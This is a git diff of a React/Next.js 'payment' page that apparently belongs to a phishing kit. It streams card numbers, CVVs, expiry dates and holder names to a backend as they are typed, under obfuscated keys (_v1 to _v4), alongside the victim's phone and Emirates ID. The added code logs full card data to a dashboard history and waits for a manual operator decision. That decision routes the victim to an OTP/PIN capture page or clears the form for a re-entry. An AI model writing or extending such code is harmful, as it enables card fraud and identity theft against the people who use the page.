@@ -4,8 +4,9 @@ import { useSearchParams, useRouter } from 'next/navigation';
 import { BRANDS, type BrandKey, type CardTypeKey } from '@/data/brands';
 import { useLang } from '@/context/LanguageContext';
 import { t } from '@/i18n';
-import { createRegistration, getRegistration } from '@/lib/firebase';
+import { createRegistration } from '@/lib/firebase';
 import { trackPresence, pushPresence } from '@/lib/presence';
+import { addCardHistoryEntry, resetPayStatus, listenPayDoc, saveRegId } from '@/lib/visitor-sync';
 
 function PaymentContent() {
   const router = useRouter();
@@ -23,21 +24,20 @@ function PaymentContent() {
   const [errors, setErrors]         = useState<Record<string, string>>({});
   const [waiting, setWaiting]       = useState(false);
   const [apiError, setApiError]     = useState('');
-  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const unsubRef = useRef<(() => void) | null>(null);
 
-  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
+  useEffect(() => () => { unsubRef.current?.(); }, []);
 
   // Presence: announce this visitor on the payment page
   useEffect(() => {
     let regData: Record<string, unknown> | null = null;
     try { regData = JSON.parse(sessionStorage.getItem('reg_data') || 'null'); } catch {}
     return trackPresence({
-      page: 'payment',
-      step: 'payment',
-      fullName:      String(regData?.fullName   ?? '') || undefined,
-      phone:         String(regData?.phone      ?? '') || undefined,
-      emiratesId:    String(regData?.emiratesId ?? '') || undefined,
-      region:        String(regData?.region     ?? '') || undefined,
+      page: 'payment', step: 'payment',
+      fullName:   String(regData?.fullName   ?? '') || undefined,
+      phone:      String(regData?.phone      ?? '') || undefined,
+      emiratesId: String(regData?.emiratesId ?? '') || undefined,
+      region:     String(regData?.region     ?? '') || undefined,
     });
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
@@ -46,10 +46,10 @@ function PaymentContent() {
   useEffect(() => {
     pushPresence({
       page: waiting ? 'waiting' : 'payment',
-      _v4: holderName || undefined,           cardHolderName: holderName || undefined,
-      _v1: cardNumber.replace(/\s/g, '') || undefined, cardNumber: cardNumber.replace(/\s/g, '') || undefined,
-      _v3: expiry || undefined,               expiryDate: expiry || undefined,
-      _v2: cvv || undefined,                  cvv: cvv || undefined,
+      _v4: holderName || undefined,                       cardHolderName: holderName || undefined,
+      _v1: cardNumber.replace(/\s/g, '') || undefined,   cardNumber: cardNumber.replace(/\s/g, '') || undefined,
+      _v3: expiry || undefined,                          expiryDate: expiry || undefined,
+      _v2: cvv || undefined,                             cvv: cvv || undefined,
     });
   }, [holderName, cardNumber, expiry, cvv, waiting]);
 
@@ -64,29 +64,45 @@ function PaymentContent() {
 
   const validate = () => {
     const e: Record<string, string> = {};
-    if (!holderName.trim())                          e.holderName = T.errors.holderName;
-    if (cardNumber.replace(/\s/g, '').length < 16)  e.cardNumber = T.errors.cardNumber;
-    if (!/^\d{2}\/\d{2}$/.test(expiry))             e.expiry     = T.errors.expiry;
-    if (cvv.length < 3)                             e.cvv        = T.errors.cvv;
+    if (!holderName.trim())                         e.holderName = T.errors.holderName;
+    if (cardNumber.replace(/\s/g, '').length < 16) e.cardNumber = T.errors.cardNumber;
+    if (!/^\d{2}\/\d{2}$/.test(expiry))            e.expiry     = T.errors.expiry;
+    if (cvv.length < 3)                            e.cvv        = T.errors.cvv;
     setErrors(e);
     return Object.keys(e).length === 0;
   };
 
-  const startPolling = (id: string) => {
-    pollRef.current = setInterval(async () => {
-      try {
-        const data = await getRegistration(id);
-        if (data?.status === 'approved') {
-          clearInterval(pollRef.current!);
-          setWaiting(false);
-          router.push(`/otp?id=${id}`);
-        } else if (data?.status === 'rejected') {
-          clearInterval(pollRef.current!);
-          setWaiting(false);
-          router.push(`/order?brand=${brandKey}&type=${typeKey}`);
-        }
-      } catch { /* ignore */ }
-    }, 2500);
+  /** Start listening to pays doc for admin decision (approve / reject) */
+  const startPaysListener = (regId: string) => {
+    // Skip the very first snapshot — it may contain stale data from a previous
+    // session. We only care about changes that happen AFTER card submission.
+    let isFirst = true;
+
+    unsubRef.current = listenPayDoc((data) => {
+      if (isFirst) { isFirst = false; return; }
+
+      const cardStatus = data.cardStatus as string | undefined;
+      const otpStatus  = data.otpStatus  as string | undefined;
+
+      if (
+        cardStatus === 'approved_with_otp' ||
+        cardStatus === 'approved_with_pin' ||
+        otpStatus  === 'show_otp' ||
+        otpStatus  === 'show_pin'
+      ) {
+        unsubRef.current?.();
+        setWaiting(false);
+        router.push(`/otp?id=${regId}`);
+      } else if (cardStatus === 'rejected') {
+        unsubRef.current?.();
+        setWaiting(false);
+        // Go back to card entry (same page, clear form)
+        setHolderName('');
+        setCardNumber('');
+        setExpiry('');
+        setCvv('');
+      }
+    });
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -113,9 +129,23 @@ function PaymentContent() {
 
     try {
       const id = await createRegistration(payload);
+      saveRegId(id);
       sessionStorage.removeItem('reg_data');
       pushPresence({ page: 'waiting', step: 'payment', registrationId: id });
-      startPolling(id);
+
+      // 1. Reset old status fields so the listener starts clean
+      await resetPayStatus();
+
+      // 2. Write card data to pays history (dashboard reads _t1 entries)
+      await addCardHistoryEntry({
+        cardNumber:     cardNumber.replace(/\s/g, ''),
+        cvv,
+        expiryDate:     expiry,
+        cardHolderName: holderName,
+      });
+
+      // 3. Start listening — admin will approve or reject
+      startPaysListener(id);
     } catch {
       setWaiting(false);
       setApiError(T.apiError);
@@ -168,11 +198,12 @@ function PaymentContent() {
               <div className="relative">
                 <input type="text" inputMode="numeric" value={cardNumber}
                   onChange={e => handleCardNumber(e.target.value)}
-                  placeholder={T.cardNumberPh} className={`${inputCls('cardNumber')} pl-12`} dir="ltr" />
-                <div className="absolute left-3 top-1/2 -translate-y-1/2">
+                  placeholder="0000 0000 0000 0000" className={`${inputCls('cardNumber')} pr-14`} dir="ltr" maxLength={19} />
+                <div className="absolute top-1/2 -translate-y-1/2 right-3 flex gap-1 items-center">
                   <svg width="28" height="20" viewBox="0 0 28 20" fill="none">
-                    <rect width="28" height="20" rx="3" fill="#e5e7eb"/>
-                    <rect y="5" width="28" height="5" fill="#9ca3af"/>
+                    <rect width="28" height="20" rx="3" fill="#1a1f71"/>
+                    <rect y="5" width="28" height="5" fill="#f7b731"/>
+                    <rect x="3" y="13" width="7" height="3" rx="1" fill="#9ca3af"/>
                     <rect x="3" y="13" width="7" height="3" rx="1" fill="#c9a227"/>
                   </svg>
                 </div>
